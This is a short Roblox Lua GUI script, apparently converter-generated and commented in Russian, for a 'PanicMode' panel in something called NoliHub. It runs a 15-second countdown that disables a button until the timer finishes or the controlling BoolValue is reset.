-- StarterGui.NoliHub.MainFrame.Shadow.PanicMode.Timer
local function C_10b()
local script = G2L["10b"];
	-- Получаем необходимые объекты
	local timerValue = script.Parent.TimerValue  -- BoolValue "Timer"
	local textLabel = script.Parent.TextTimer  -- TextLabel для отображения таймера
	local button = script.Parent.TextButton1  -- TextButton, который будет недоступен
	
	-- Устанавливаем начальные значения
	button.Active = true  -- Кнопка изначально доступна
	textLabel.Text = ""  -- Текст таймера изначально пуст
	
	local countdownTime = 15  -- Время таймера в секундах
	local countdownRunning = false  -- Флаг для отслеживания состояния таймера
	
	-- Функция для запуска таймера
	local function startTimer()
		countdownRunning = true  -- Устанавливаем флаг запуска таймера
		button.Interactable = false  -- Деактивируем кнопку
		local remainingTime = countdownTime
	
		-- Запуск цикла таймера
		while remainingTime > 0 and countdownRunning do
			textLabel.Text = "(" .. remainingTime .. ")"  -- Обновление текста таймера
			wait(1)  -- Ждем 1 секунду
			remainingTime -= 1  -- Уменьшаем оставшееся время
		end
	
		-- После завершения таймера
		if countdownRunning then
			textLabel.Text = "Вы же успели подумать, да?"  -- Текст после окончания таймера
			button.Interactable = true  -- Активируем кнопку
		end
	
		countdownRunning = false  -- Сбрасываем флаг запуска таймера
	end
	
	-- Функция для остановки таймера
	local function stopTimer()
		countdownRunning = false  -- Останавливаем таймер
		textLabel.Text = ""  -- Сбрасываем текст таймера
		button.Interactable = true  -- Активируем кнопку
	end
	
	-- Отслеживание изменений BoolValue в реальном времени
	timerValue:GetPropertyChangedSignal("Value"):Connect(function()
		if timerValue.Value == true then
			startTimer()  -- Запуск таймера, если значение равно true
		else
			stopTimer()  -- Остановка таймера, если значение равно false
		end
	end)
	
end;
task.spawn(C_10b);
